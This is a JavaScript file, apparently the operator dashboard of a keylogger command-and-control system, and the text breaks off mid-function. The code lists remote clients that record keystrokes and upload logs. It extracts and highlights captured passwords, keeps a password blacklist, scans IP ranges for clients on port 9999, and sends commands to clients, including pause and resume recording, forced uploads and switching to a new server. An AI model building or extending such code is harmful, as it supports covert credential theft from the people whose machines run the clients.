// 全局变量
let ws = null;
let clients = [];
let currentClientId = null;
let reconnectTimer = null;
let reconnectDelay = 1000;
let toastTimer = null;
let isUnloading = false;
let isReconnecting = false;
let reconnectAttempts = 0;
let connectingClients = new Set();
let currentExtractedPasswords = [];
let lastExtractedPasswords = null;
// 提取结果分页相关
let extractedPage = 1;                // 当前页码
const EXTRACT_PAGE_SIZE = 50;         // 每页条数
let extractedSearchKeyword = '';
// 日志分页相关
let currentLogContent = '';             // 当前查看的完整日志文本
let currentLogPage = 1;                 // 当前页码
const LOG_PAGE_SIZE = 500;              // 每页行数
let currentLogHighlightPassword = '';   // 需要高亮的密码（可选）
let currentLogHighlightRaw = '';        // 原始密码高亮（可选）
let currentLogScrollTarget = '';        // 需要滚动到的目标文本
let currentLogClientId = '';
let currentLogFilename = ''; 
let blacklistPage = 1;
let blacklistPageSize = 20;
let blacklistTotalPages = 1;
const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}`;
const MAX_RECONNECT_DELAY = 30000;

// Alist 配置
let ALIST_BASE_URL = '';
let ALIST_BASE_PATH = '';

// 全局变量：当前扫描出的过期文件列表
let currentExpiredFiles = [];

// DOM 元素
const dom = {
    wsStatus: document.getElementById('wsStatus'),
    wsStatusText: document.getElementById('wsStatusText'),
    clientsTable: document.getElementById('clientsTable'),
    logClientSelect: document.getElementById('logClientSelect'),
    logsTable: document.getElementById('logsTable'),
    scanProgress: document.getElementById('scanProgress'),
    toast: document.getElementById('toast')
};

function stopAutoRefresh() {

}

function normalizePassword(value) {
    if (!value) return '';
    let normalized = String(value).trim();
    // 移除所有空格和换行符
    normalized = normalized.replace(/\s+/g, '');
    // 移除特殊字符，与后端保持一致
    normalized = normalized.replace(/[^\w!@#$%^&*()_+\-=\[\]{}|;':",./<>?`~]/g, '');
    return normalized;
}

// 模糊匹配函数：支持不连续匹配
function fuzzyMatch(keyword, text) {
    if (!keyword) return true;
    keyword = keyword.toLowerCase();
    text = text.toLowerCase();
    let keywordIndex = 0;
    for (let i = 0; i < text.length && keywordIndex < keyword.length; i++) {
        if (text[i] === keyword[keywordIndex]) {
            keywordIndex++;
        }
    }
    return keywordIndex === keyword.length;
}

function escapeHtml(value) {
    return String(value || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/**
 * 对客户端数组进行排序
 * 排序规则：在线的在前，离线的在后；状态相同时按IP地址排序
 * @param {Array} clients - 客户端数组
 * @returns {Array} 排序后的新数组
 */
function sortClients(clients) {
    return [...clients].sort((a, b) => {
        if (a.status === 'online' && b.status !== 'online') return -1;
        if (a.status !== 'online' && b.status === 'online') return 1;
        // IP 地址按数值排序（将 IP 转换为数字）
        const ipToNum = (ip) => {
            const parts = ip.split('.');
            if (parts.length !== 4) return 0;
            return parts.reduce((acc, part, idx) => acc + parseInt(part, 10) * Math.pow(256, 3 - idx), 0);
        };
        return ipToNum(a.ip) - ipToNum(b.ip);
    });
}

// 页面切换
document.querySelectorAll('.nav-item').forEach(item => {
    item.addEventListener('click', () => {
        const page = item.dataset.page;
        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
        document.getElementById(page + 'Page').style.display = 'block';
        if (page === 'logs') {
            populateClientSelect();
            refreshLogs();
        } else if (page === 'blacklist') {
            blacklistPage = 1;
            loadBlacklist();
            stopAutoRefresh();
        } else if (page === 'settings') {
            loadVersions();
            stopAutoRefresh();
        } else {
            stopAutoRefresh();
        }
    });
});

// 通用确认模态框
let confirmCallback = null;

function showConfirmModal(title, message, onConfirm) {
    document.getElementById('confirmTitle').textContent = title || '确认操作';
    document.getElementById('confirmMessage').textContent = message || '确定执行此操作吗？';
    document.getElementById('confirmModal').classList.add('show');
    confirmCallback = onConfirm;
}

// 确认按钮点击事件
document.getElementById('confirmOkBtn').addEventListener('click', () => {
    hideModal('confirmModal');
    if (typeof confirmCallback === 'function') {
        confirmCallback();
        confirmCallback = null;
    }
});

// 初始化 WebSocket
function connectWebSocket() {
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;

    if (reconnectTimer) {
        clearTimeout(reconnectTimer);
        reconnectTimer = null;
    }

    ws = new WebSocket(WS_URL);

    ws.onopen = () => {
        dom.wsStatus.classList.add('connected');
        dom.wsStatusText.textContent = '已连接';
        console.info('WebSocket 已连接:', WS_URL);
        const wasReconnect = reconnectAttempts > 0;
        reconnectAttempts = 0;
        isReconnecting = false;
        reconnectDelay = 1000;
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
            reconnectTimer = null;
        }
        showToast(wasReconnect ? '已重新连接到服务器' : '已连接到服务器', 'success');
    };

        ws.onclose = (event) => {
        dom.wsStatus.classList.remove('connected');
        dom.wsStatusText.textContent = '已断开';
        
        // 清理所有连接中的客户端状态
        connectingClients.clear();
        if (window.connectTimeouts) {
            window.connectTimeouts.forEach(timeoutId => clearTimeout(timeoutId));
            window.connectTimeouts.clear();
        }
        
        // 完全清理 WebSocket 状态
        if (ws) {
            ws.onopen = null;
            ws.onclose = null;
            ws.onerror = null;
            ws.onmessage = null;
            ws = null;
        }
        console.warn('WebSocket 关闭:', event.code, event.reason);

        if (isUnloading) return;

        if (event && event.code === 1008) {
            dom.wsStatusText.textContent = '未授权';
            showToast('WebSocket 未授权，请重新登录', 'error');
            return;
        }

        if (!isReconnecting) {
            showToast('与服务器断开，正在重连...', 'error');
        }
        isReconnecting = true;
        dom.wsStatusText.textContent = '重连中...';
        if (reconnectTimer) {
            clearTimeout(reconnectTimer);
            reconnectTimer = null;
        }

        reconnectTimer = setTimeout(() => {
            reconnectAttempts += 1;
            connectWebSocket();
        }, reconnectDelay);
        reconnectDelay = Math.min(MAX_RECONNECT_DELAY, reconnectDelay * 1.5);
    };

    ws.onerror = (err) => {
        console.error('WebSocket 错误:', err);
    };

    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            handleWebSocketMessage(data);
        } catch (e) {
            console.error('解析消息失败:', e);
        }
    };
}

// 处理 WebSocket 消息
function handleWebSocketMessage(data) {
    switch (data.type) {
        case 'clients_list':
            clients = data.clients;
            renderClientsTable();
            populateClientSelect();
            break;

        case 'client_updated':
            if (data.client) {
                if (data.event === 'deleted') {
                    // 删除事件
                    removeClientFromList(data.client.id);
                } else {
                    // 连接、离线、更新等事件
                    updateClientInList(data.client);
                }
            }
            populateClientSelect();
            break;

        case 'client_response':
            console.log('客户端响应:', data);
            if (data.response && data.response.data) {
                const client = clients.find(c => c.id === data.clientId);
                if (client) {
                    if (data.response.data.recording !== undefined) {
                        client.recording = data.response.data.recording;
                    }
                    if (data.response.data.upload_enabled !== undefined) {
                        client.uploadEnabled = data.response.data.upload_enabled;
                    }
                    renderClientsTable();
                }
            }
            break;

        case 'command_result':
            console.log('命令结果:', data.result);
            if (data.result.success) {
                showToast('命令已发送', 'success');
            } else {
                showToast('命令发送失败: ' + data.result.error, 'error');
            }
            break;

        case 'broadcast_result':
            const successCount = data.results.filter(r => r.success).length;
            showToast(`广播完成: ${successCount}/${data.results.length} 成功`, 'success');
            break;

        case 'scan_complete':
            dom.scanProgress.classList.remove('show');
            showToast(`扫描完成，发现 ${data.found.length} 个客户端`, 'success');
            break;

        case 'scan_error':
            dom.scanProgress.classList.remove('show');
            showToast('扫描失败: ' + data.message, 'error');
            break;

        case 'connect_result':
            if (data.client) {
                if (window.connectTimeouts?.has(data.client.id)) {
                    clearTimeout(window.connectTimeouts.get(data.client.id));
                    window.connectTimeouts.delete(data.client.id);
                }
                connectingClients.delete(data.client.id);
                renderClientsTable();
                showToast(`成功连接 ${data.client.ip}:${data.client.port}`, 'success');
            } else {
                showToast('连接失败：服务器无响应', 'error');
            }
            break;

        case 'connect_error':
            if (data.clientId) {
                if (window.connectTimeouts?.has(data.clientId)) {
                    clearTimeout(window.connectTimeouts.get(data.clientId));
                    window.connectTimeouts.delete(data.clientId);
                }
                connectingClients.delete(data.clientId);
                renderClientsTable();
            }
            showToast('连接失败: ' + (data.message || '未知错误'), 'error');
            break;

        case 'disconnect_result':
            if (data.success) {
                showToast('客户端已断开', 'success');
            } else {
                showToast('断开失败: ' + (data.message || '未知错误'), 'error');
            }
            break;

        case 'delete_result':
            if (data.success) {
                showToast('客户端已删除', 'success');
            } else {
                showToast('删除失败: ' + data.error, 'error');
            }
            break;
        
            case 'client_deleted':
                removeClientFromList(data.clientId);
            break;

        case 'error':
            showToast('服务器错误: ' + data.message, 'error');
            break;

        default:
            console.log('未知消息类型:', data);
    }
}

// 更新客户端列表中的某个客户端
function updateClientInList(client) {
    const index = clients.findIndex(c => c.id === client.id);
    if (index >= 0) {
        clients = [...clients.slice(0, index), client, ...clients.slice(index + 1)];
    } else {
        clients = [...clients, client];
    }
    renderClientsTable();
}

// 从列表中移除客户端
function removeClientFromList(clientId) {
    clients = clients.filter(c => c.id !== clientId);
    renderClientsTable();
    populateClientSelect();
}

// 渲染客户端表格
// 渲染客户端表格
function renderClientsTable() {
    if (clients.length === 0) {
        dom.clientsTable.innerHTML = '<tr><td colspan="8" class="empty-state">暂无客户端</td></tr>';
        return;
    }

    // 按照连接状态排序：在线的在前面，离线的在后面
    const sortedClients = sortClients(clients);

    let html = '';
    sortedClients.forEach(client => {
        const statusClass = client.status === 'online' ? 'status-online' : 'status-offline';
        const recordClass = client.recording ? 'status-recording' : 'status-paused';
        const uploadClass = client.uploadEnabled ? 'status-recording' : 'status-paused';
        const lastSeen = client.lastSeen ? new Date(client.lastSeen).toLocaleString() : '从未';
        const safeId = escapeHtml(client.id);
        const safeIp = escapeHtml(client.ip);
        const safePort = escapeHtml(client.port);
        const safeStatus = escapeHtml(client.status);
        const version = client.version || '未知';
        const isConnecting = connectingClients.has(client.id);

        let actionButtons = `
            <button class="btn btn-sm btn-primary" onclick="showClientModal('${safeId}')">
                <i class="fas fa-info-circle"></i> 详情
            </button>
        `;

        if (client.status === 'online') {
            actionButtons += `<button class="btn btn-sm btn-warning" onclick="disconnectClient('${safeId}')">
                <i class="fas fa-times-circle"></i> 断开
            </button>`;
        } else {
            const connectBtnText = isConnecting 
                ? '<span class="btn-spinner"></span> 连接中' 
                : '<i class="fas fa-plug"></i> 连接';
            const disabledAttr = isConnecting ? 'disabled' : '';
            actionButtons += `<button class="btn btn-sm btn-success" onclick="connectClient('${safeIp}', ${safePort}, '${safeId}')" ${disabledAttr}>${connectBtnText}</button>`;
        }
        actionButtons += `<button class="btn btn-sm btn-danger" onclick="deleteClient('${safeId}')">
            <i class="fas fa-trash"></i> 删除
        </button>`;

        html += `<tr>
            <td>${safeIp}</td>
            <td>${safePort}</td>
            <td><span class="status-badge" style="background:rgba(59,130,246,0.1);color:var(--primary);">${escapeHtml(version)}</span></td>
            <td><span class="status-badge ${statusClass}">${safeStatus}</span></td>
            <td><span class="status-badge ${recordClass}">${client.recording ? '录制中' : '已暂停'}</span></td>
            <td><span class="status-badge ${uploadClass}">${client.uploadEnabled ? '已启用' : '未启用'}</span></td>
            <td>${escapeHtml(lastSeen)}</td>
            <td>
                <div class="action-btns">
                    ${actionButtons}
                </div>
            </td>
        </tr>`;
    });
    dom.clientsTable.innerHTML = html;
}

// 填充日志页面的客户端下拉框
function populateClientSelect() {
    // 按照连接状态排序：在线的在前面，离线的在后面
    const sortedClients = sortClients(clients);

    let html = '<option value="">全部</option>';
    sortedClients.forEach(client => {
        html += `<option value="${escapeHtml(client.id)}">${escapeHtml(client.ip)}:${escapeHtml(client.port)} (${escapeHtml(client.status)})</option>`;
    });
    dom.logClientSelect.innerHTML = html;
}

// 显示客户端详情模态框
function showClientModal(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;

    currentClientId = clientId;
    document.getElementById('clientModalTitle').textContent = `客户端: ${client.ip}:${client.port}`;
    
    // 概览信息
    const infoHtml = `
        <p><strong>ID:</strong> ${escapeHtml(client.id)}</p>
        <p><strong>IP:</strong> ${escapeHtml(client.ip)}</p>
        <p><strong>端口:</strong> ${escapeHtml(client.port)}</p>
        <p><strong>版本:</strong> ${escapeHtml(client.version || '未知')}</p>
        <p><strong>状态:</strong> ${escapeHtml(client.status)}</p>
        <p><strong>录制状态:</strong> ${client.recording ? '录制中' : '已暂停'}</p>
        <p><strong>上传状态:</strong> ${client.uploadEnabled ? '已启用' : '未启用'}</p>
        <p><strong>最后连接:</strong> ${escapeHtml(client.lastSeen ? new Date(client.lastSeen).toLocaleString() : '从未')}</p>
    `;
    document.getElementById('clientInfo').innerHTML = infoHtml;

    // 加载客户端日志列表
    loadClientLogs(clientId);

    document.getElementById('clientModal').classList.add('show');
}

// 获取日志文件信息
async function getLogsInfo() {
    if (!currentClientId) {
        showToast('请先选择客户端', 'error');
        return;
    }
    
    try {
        showToast('正在获取日志文件信息...', 'success');
        const response = await fetch(`/api/clients/${currentClientId}/logs/info`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({})
        });
        
        const result = await response.json();
        if (response.ok && result.success) {
            showToast('已发送获取日志文件信息请求', 'success');
        } else {
            showToast(`获取失败: ${result.error || '未知错误'}`, 'error');
        }
    } catch (e) {
        console.error('获取日志文件信息失败:', e);
        showToast('获取请求失败', 'error');
    }
}

// 删除指定日志
function deleteClientLog(filename) {
    if (!currentClientId) {
        showToast('请先选择客户端', 'error');
        return;
    }
    showConfirmModal(
        '删除日志文件',
        `确定要删除日志文件 "${filename}" 吗？此操作不可恢复！`,
        async () => {
            try {
                showToast('正在删除日志文件...', 'success');
                const response = await fetch(`/api/clients/${currentClientId}/logs/delete`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ file: filename })
                });
                const result = await response.json();
                if (response.ok && result.success) {
                    showToast('已发送删除日志文件请求', 'success');
                    if (document.getElementById('clientModal').classList.contains('show')) {
                        loadClientLogs(currentClientId);
                    }
                } else {
                    showToast(`删除失败: ${result.error || '未知错误'}`, 'error');
                }
            } catch (e) {
                console.error('删除日志文件失败:', e);
                showToast('删除请求失败', 'error');
            }
        }
    );
}

// 暂停录制
function pauseRecord() {
    sendCommand('pause_record');
}

// 恢复录制
function resumeRecord() {
    sendCommand('resume_record');
}

// 获取完整状态
function getStatus() {
    sendCommand('get_status');
}

// 立即上传
function uploadOnce() {
    const count = parseInt(document.getElementById('uploadCount').value) || 1;
    sendCommand('upload_once', { count });
}

// 加载客户端日志
async function loadClientLogs(clientId) {
    const client = clients.find(c => c.id === clientId);
    if (!client) return;

    try {
        // 强制刷新避免缓存
        const response = await fetch(`/api/clients/${clientId}/logs?refresh=true`);
        const logs = await response.json();
        if (logs.length === 0) {
            document.getElementById('clientLogs').innerHTML = '<p>暂无日志文件</p>';
            return;
        }
        let html = '<ul style="list-style: none; padding: 0;">';
        logs.forEach(log => {
            const safeFilename = escapeHtml(log.filename);
            const safeClientId = escapeHtml(clientId);
            html += `<li style="padding: 0.5rem; border-bottom: 1px solid rgba(255,255,255,0.08); display: flex; justify-content: space-between; align-items: center;">
                <span>${safeFilename}</span>
                <div class="action-btns">
                    <button class="btn btn-sm btn-primary" onclick="viewLog('${safeClientId}', '${safeFilename}')">查看</button>
                    <button class="btn btn-sm btn-success" onclick="downloadLog('${safeClientId}', '${safeFilename}')">下载</button>
                    <button class="btn btn-sm btn-danger" onclick="deleteLog('${safeClientId}', '${safeFilename}')">删除</button>
                </div>
            </li>`;
        });
        html += '</ul>';
        document.getElementById('clientLogs').innerHTML = html;
    } catch (e) {
        console.error('加载日志失败:', e);
        document.getElementById('clientLogs').innerHTML = '<p>加载失败</p>';
    }
}

// 模态框标签切换
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
        const tabName = tab.dataset.tab;
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        tab.classList.add('active');
        document.getElementById(tabName + 'Tab').classList.add('active');
    });
});

// 发送命令给当前选中的客户端
function sendCommand(action, params = {}) {
    if (!currentClientId) {
        showToast('请先选择客户端', 'error');
        return;
    }
    ws.send(JSON.stringify({
        type: 'command',
        clientId: currentClientId,
        command: { action, ...params }
    }));
}

// 广播命令
function broadcastCommand(action, params = {}) {
    ws.send(JSON.stringify({
        type: 'broadcast_command',
        command: { action, ...params }
    }));
}

// 设置服务器地址
function setServer() {
    const host = document.getElementById('serverHost').value;
    const port = document.getElementById('serverPort').value;
    if (!host || !port) {
        showToast('请填写服务器地址和端口', 'error');
        return;
    }
    sendCommand('set_server', { host, port: parseInt(port) });
}

// 断开客户端连接
function disconnectClient(clientId) {
    showConfirmModal(
        '断开连接',
        '确定断开该客户端连接吗？',
        () => {
            ws.send(JSON.stringify({ type: 'disconnect_client', clientId }));
        }
    );
}

// 删除客户端
function deleteClient(clientId) {
    showConfirmModal(
        '删除客户端',
        '确定要删除该客户端吗？此操作会从数据库中永久移除记录。',
        () => {
            ws.send(JSON.stringify({ type: 'delete_client', clientId }));
            if (currentClientId === clientId) {
                hideModal('clientModal');
            }
        }
    );
}

function manualConnect() {
    const ip = document.getElementById('connectIp').value.trim();
    const port = parseInt(document.getElementById('connectPort').value);
    if (!ip || !port) {
        showToast('请填写 IP 和端口', 'error');
        return;
    }
    // 关闭模态框
    hideModal('connectModal');
    // 清空输入
    document.getElementById('connectIp').value = '';
    document.getElementById('connectPort').value = '9999';
    
    ws.send(JSON.stringify({
        type: 'manual_connect',
        ip,
        port
    }));
    showToast(`正在尝试连接 ${ip}:${port}...`, 'success');
}

function connectClient(ip, port, clientId) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        showToast('WebSocket 未连接', 'error');
        return;
    }
    
    // 添加连接中标记
    connectingClients.add(clientId);
    renderClientsTable();
    
    // 即时反馈
    showToast(`正在连接 ${ip}:${port}...`, 'success');
    
    // 设置超时定时器（10秒）
    const timeoutId = setTimeout(() => {
        if (connectingClients.has(clientId)) {
            connectingClients.delete(clientId);
            renderClientsTable();
            showToast(`连接 ${ip}:${port} 超时`, 'error');
        }
    }, 10000);
    
    ws.send(JSON.stringify({
        type: 'manual_connect',
        ip,
        port
    }));
    
    if (!window.connectTimeouts) window.connectTimeouts = new Map();
    window.connectTimeouts.set(clientId, timeoutId);
}

// 一键连接全部离线客户端
function connectAllClients() {
    const offlineClients = clients.filter(c => c.status === 'offline');
    if (offlineClients.length === 0) {
        showToast('没有离线客户端', 'error');
        return;
    }
    showToast(`正在尝试连接 ${offlineClients.length} 个离线客户端...`, 'success');
    offlineClients.forEach(client => {
        connectClient(client.ip, client.port, client.id);
    });
}

// 扫描网络
function scanNetwork() {
    const startIp = document.getElementById('scanStartIp').value;
    const endIp = document.getElementById('scanEndIp').value;
    const portsStr = document.getElementById('scanPorts').value;
    if (!startIp || !endIp) {
        showToast('请填写起始和结束 IP', 'error');
        return;
    }
    const ports = portsStr.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
    ws.send(JSON.stringify({
        type: 'scan_network',
        startIp, endIp, ports
    }));
    dom.scanProgress.classList.add('show');
    hideModal('scanModal');
}

// 刷新日志列表（日志页面）
async function refreshLogs() {
    const clientId = dom.logClientSelect.value;
    try {
        let logs, fetchClientId;
        // 请求带上 refresh=true，强制后端绕过 Alist 缓存
        if (clientId) {
            const response = await fetch(`/api/clients/${clientId}/logs?refresh=true`);
            logs = await response.json();
            fetchClientId = clientId;
        } else {
            const response = await fetch('/api/logs?refresh=true');
            logs = await response.json();
            fetchClientId = null;
        }
        renderLogsTable(logs, fetchClientId);
    } catch (e) {
        console.error('刷新日志失败:', e);
        showToast('刷新失败', 'error');
    }
}

// 渲染日志表格（包含删除按钮）
function renderLogsTable(logs, clientId) {
    if (logs.length === 0) {
        dom.logsTable.innerHTML = '<tr><td colspan="4" class="empty-state">暂无日志文件</td></tr>';
        return;
    }
    let html = '';
    logs.forEach(log => {
        const size = formatFileSize(log.size);
        const time = log.uploadTime ? new Date(log.uploadTime).toLocaleString() : '未知';
        let logClientId = clientId;
        if (!logClientId) {
            const ipMatch = log.filename.match(/^(\d+\.\d+\.\d+\.\d+)_/);
            if (ipMatch) {
                const ip = ipMatch[1];
                const client = clients.find(c => c.ip === ip);
                logClientId = client ? client.id : `${ip}:9999`;
            }
        }
        if (logClientId) {
            html += `<tr>
                <td>${escapeHtml(log.filename)}</td>
                <td>${size}</td>
                <td>${time}</td>
                <td>
                    <div class="action-btns">
                        <button class="btn btn-sm btn-primary" onclick="viewLog('${escapeHtml(logClientId)}', '${escapeHtml(log.filename)}')">
                            <i class="fas fa-eye"></i> 查看
                        </button>
                        <button class="btn btn-sm btn-success" onclick="downloadLog('${escapeHtml(logClientId)}', '${escapeHtml(log.filename)}')">
                            <i class="fas fa-download"></i> 下载
                        </button>
                        <button class="btn btn-sm btn-danger" onclick="deleteLog('${escapeHtml(logClientId)}', '${escapeHtml(log.filename)}')">
                            <i class="fas fa-trash"></i> 删除
                        </button>
                    </div>
                </td>
            </tr>`;
        }
    });
    dom.logsTable.innerHTML = html;
}

async function viewLog(clientId, filename, options = {}) {
    const { password = '', rawPassword = '' } = options;  // 解构参数
    try {
        const response = await fetch(`/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}/raw`);
        const content = await response.text();

        // 保存全局状态
        currentLogContent = content;
        currentLogClientId = clientId;
        currentLogFilename = filename;
        currentLogHighlightPassword = password || '';
        currentLogHighlightRaw = rawPassword || '';
        currentLogScrollTarget = rawPassword || password || '';

        // 智能页码定位
        if (currentLogScrollTarget) {
            // 先尝试精确匹配
            let searchText = currentLogScrollTarget.replace(/↵/g, '\n');
            let index = content.indexOf(searchText);
            
            // 如果精确匹配失败，尝试模糊匹配（移除按键标记）
            if (index === -1 && rawPassword) {
                searchText = rawPassword.replace(/↵/g, '').replace(/\[[^\]]+\]/g, '').trim();
                if (searchText) {
                    index = content.indexOf(searchText);
                }
            }
            
            // 如果还失败，尝试匹配解析后的密码
            if (index === -1 && password) {
                index = content.indexOf(password);
            }
            
            if (index !== -1) {
                const before = content.substring(0, index);
                const lineNumber = before.split('\n').length;
                currentLogPage = Math.max(1, Math.ceil(lineNumber / LOG_PAGE_SIZE));
            } else {
                currentLogPage = 1;
            }
        } else {
            currentLogPage = 1;
        }

        document.getElementById('logModalTitle').textContent = filename;
        renderLogPage();
        document.getElementById('logModal').classList.add('show');
    } catch (e) {
        console.error('查看日志失败:', e);
        showToast('查看失败', 'error');
    }
}

// 查看日志内容并滚动到包含原始密码数据的行


// 添加闪烁效果
function addBlinkEffect(element) {
    element.classList.add('blink');
    setTimeout(() => {
        element.classList.remove('blink');
    }, 2000);
}

// 滚动到文本位置
function scrollToTextPosition(text) {
    if (!text) return;
    
    const contentElement = document.getElementById('logContent');
    const contentText = contentElement.textContent;
    
    // 尝试精确匹配
    let index = contentText.indexOf(text);
    
    // 如果精确匹配失败，尝试部分匹配（去掉首尾空格）
    if (index === -1) {
        const trimmedText = text.trim();
        if (trimmedText) {
            index = contentText.indexOf(trimmedText);
        }
    }
    
    // 如果部分匹配也失败，尝试模糊匹配（忽略空格差异）
    if (index === -1) {
        const normalizedText = text.replace(/\s+/g, ' ').trim();
        const normalizedContent = contentText.replace(/\s+/g, ' ').trim();
        index = normalizedContent.indexOf(normalizedText);
    }
    
    if (index !== -1) {
        contentElement.scrollTop = 0;
        // 计算更精确的滚动位置
        const lineHeight = 16; // 估算行高
        const lines = contentText.substring(0, index).split('\n').length;
        const scrollPosition = Math.max(0, (lines - 5) * lineHeight); // 滚动到匹配位置上方5行
        contentElement.scrollTop = scrollPosition;
    }
}

// 滚动到高亮位置
function scrollToHighlight(rawPassword) {
    setTimeout(() => {
        const highlight = document.querySelector('.raw-password-highlight') || 
                         document.querySelector('.password-highlight');
        
        if (highlight) {
            highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
            addBlinkEffect(highlight);
        } else if (rawPassword) {
            scrollToTextPosition(rawPassword);
        }
    }, 100);
}

// 高亮密码
function highlightPassword(content, password, className) {
    if (!password) return content;
    
    // 先尝试直接字符串替换（更可靠）
    if (content.includes(password)) {
        return content.replace(
            password, 
            `<span class="${className}">${password}</span>`
        );
    }
    
    // 如果字符串替换失败，尝试正则表达式替换
    try {
        const escapedPassword = escapeRegexSpecialChars(password);
        return content.replace(
            new RegExp(escapedPassword, 'g'), 
            `<span class="${className}">${password}</span>`
        );
    } catch (e) {
        console.warn('正则匹配失败:', e);
        return content;
    }
}

// 生成高亮内容
function generateHighlightedContent(content, password, rawPassword) {
    let highlightedContent = content;
    
    if (rawPassword) {
        highlightedContent = highlightPassword(highlightedContent, rawPassword, 'raw-password-highlight');
        
        // 如果原始密码高亮失败，尝试高亮解析后的密码
        if (highlightedContent === content) {
            highlightedContent = highlightPassword(highlightedContent, password, 'password-highlight');
        }
    } else {
        highlightedContent = highlightPassword(highlightedContent, password, 'password-highlight');
    }
    
    return highlightedContent;
}

// 转义正则表达式特殊字符
function escapeRegexSpecialChars(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// 获取日志内容
async function fetchLogContent(clientId, filename) {
    const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
    
    if (!response.ok) {
        throw new Error(`服务器返回错误: ${response.status}`);
    }
    
    return await response.text();
}

// 下载日志
function downloadLog(clientId, filename) {
    showConfirmModal(
        '下载日志文件',
        `确定要下载文件 "${filename}" 吗？`,
        () => {
            // 使用隐藏的 a 标签触发下载，保持当前页不变
            const link = document.createElement('a');
            link.href = `/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}/download`;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            showToast('开始下载', 'success');
        }
    );
}

// 删除日志
function deleteLog(clientId, filename) {
    showConfirmModal(
        '删除日志文件',
        `确定要删除日志文件 "${filename}" 吗？此操作不可恢复！`,
        async () => {
            try {
                const response = await fetch(`/api/clients/${encodeURIComponent(clientId)}/logs/${encodeURIComponent(filename)}`, {
                    method: 'DELETE'
                });
                const result = await response.json();
                if (response.ok) {
                    showToast(`日志 ${filename} 已删除`, 'success');
                    refreshLogs();
                    if (currentClientId === clientId && document.getElementById('clientModal').classList.contains('show')) {
                        loadClientLogs(clientId);
                    }
                } else {
                    showToast(`删除失败: ${result.error || '未知错误'}`, 'error');
                }
            } catch (e) {
                console.error('删除日志失败:', e);
                showToast('删除请求失败', 'error');
            }
        }
    );
}

// 格式化文件大小
function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
}

// 显示模态框
function showConnectModal() {
    document.getElementById('connectModal').classList.add('show');
}

function showScanModal() {
    document.getElementById('scanModal').classList.add('show');
}

function showModal(modalId) {
    document.getElementById(modalId).classList.add('show');
}

function hideModal(modalId) {
    document.getElementById(modalId).classList.remove('show');
}

// 保存设置
function saveSettings() {
    const interval = document.getElementById('heartbeatInterval').value;
    const timeout = document.getElementById('connectTimeout').value;
    showToast(`设置已保存 (心跳: ${interval}ms, 超时: ${timeout}ms)`, 'success');
}

async function loadBlacklist(page = 1) {
    try {
        blacklistPage = page;
        const response = await fetch(`/api/blacklist?page=${blacklistPage}&limit=${blacklistPageSize}`);
        if (!response.ok) {
            throw new Error('加载黑名单失败');
        }

        const data = await response.json();
        const rows = data.blacklist || [];
        blacklistTotalPages = data.totalPages || 1;
        blacklistPage = data.page || blacklistPage;
        const table = document.getElementById('blacklistTable');
        if (rows.length === 0) {
            table.innerHTML = `<tr><td colspan="3" class="empty-state">暂无屏蔽密码</td></tr>`;
        } else {
            let html = '';
            rows.forEach(row => {
                html += `
                    <tr data-id="${row.id}">
                        <td>${escapeHtml(row.password)}</td>
                        <td>${escapeHtml(row.created_at)}</td>
                        <td>
                            <button class="btn btn-sm btn-danger" onclick="deleteBlacklistEntry(${row.id})">
                                <i class="fas fa-trash"></i> 取消屏蔽
                            </button>
                        </td>
                    </tr>
                `;
            });
            table.innerHTML = html;
        }

        document.getElementById('blacklistPagerInfo').textContent = `第 ${blacklistPage} 页 / ${blacklistTotalPages} 页`;
    } catch (e) {
        console.error('加载黑名单失败:', e);
        showToast('加载黑名单失败', 'error');
    }
}

function changeBlacklistPage(delta) {
    const targetPage = blacklistPage + delta;
    if (targetPage < 1 || targetPage > blacklistTotalPages) {
        return;
    }
    loadBlacklist(targetPage);
}

async function deleteBlacklistEntry(id) {
    showConfirmModal(
        '取消屏蔽',
        '确认删除该屏蔽密码？此操作不可恢复。',
        async () => {
            try {
                const response = await fetch(`/api/blacklist/${id}`, { method: 'DELETE' });
                const result = await response.json();
                if (!response.ok || !result.success) {
                    throw new Error(result.error || '删除失败');
                }
                showToast('已删除黑名单项', 'success');
                loadBlacklist();
            } catch (e) {
                console.error('删除黑名单失败:', e);
                showToast(e.message || '删除黑名单失败', 'error');
            }
        }
    );
}

// Toast 提示
function showToast(message, type = 'success') {
    const icon = type === 'success' ? '<i class="fas fa-check-circle"></i>' : '<i class="fas fa-exclamation-circle"></i>';
    dom.toast.innerHTML = `${icon} ${message}`;
    dom.toast.className = `toast ${type} show`;
    if (toastTimer) {
        clearTimeout(toastTimer);
    }
    toastTimer = setTimeout(() => {
        dom.toast.classList.remove('show');
        toastTimer = null;
    }, 3000);
}

// 日志页面客户端选择变化
dom.logClientSelect.addEventListener('change', () => {
    refreshLogs();
});

// 日志搜索过滤
document.getElementById('logSearch')?.addEventListener('input', (e) => {
